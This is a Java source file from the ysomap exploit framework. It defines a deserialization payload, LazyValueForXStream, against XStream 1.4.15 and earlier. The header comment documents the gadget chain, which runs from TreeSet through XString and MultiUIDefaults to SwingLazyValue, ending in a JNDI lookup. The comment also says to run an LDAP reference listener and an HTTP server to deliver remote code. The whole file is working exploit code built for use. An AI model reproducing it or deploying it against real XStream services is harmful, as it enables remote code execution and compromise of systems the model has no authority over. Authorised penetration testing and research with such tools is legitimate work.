package ysomap.payloads.xstream;

import sun.swing.SwingLazyValue;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.bullets.jdk.SwingLazyValueWithJNDIBullet;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;

import javax.swing.*;

/**
 * gadget chain
 * TreeSet.put
 * javax.naming.ldap.Rdn$RdnEntry.compareTo
 *     com.sun.org.apache.xpath.internal.objects.XString.equal
 *         javax.swing.MultiUIDefaults.toString
 *             UIDefaults.get
 *                 UIDefaults.getFromHashTable
 *                     UIDefaults$LazyValue.createValue
 *                     SwingLazyValue.createValue
 *                         javax.naming.InitialContext.doLookup()
 *
 * setup a LDAPRefListener & SimpleHTTPServer
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.WH1T3P1G })
@Targets({ Targets.XSTREAM })
@Dependencies({"<=com.thoughtworks.xstream:xstream:1.4.15"})
@Require(bullets = {
        "SwingLazyValueWithJNDIBullet",
        "SwingLazyValueWithRMIBullet",
        "SwingLazyValueWithUrlClassLoaderBullet"}, param = false)
public class LazyValueForXStream extends XStreamPayload<Object> {

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return SwingLazyValueWithJNDIBullet.newInstance(args);
    }

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof SwingLazyValue;
    }

    @Override
    public Object pack(Object obj) throws Exception {
        UIDefaults uiDefaults = new UIDefaults();
        Object multiUIDefaults =
                ReflectionHelper.newInstance("javax.swing.MultiUIDefaults", new Object[]{new UIDefaults[]{uiDefaults}});
        uiDefaults.put("lazyValue", obj);

        return PayloadHelper.makeTreeSetWithXString(multiUIDefaults);
    }

}
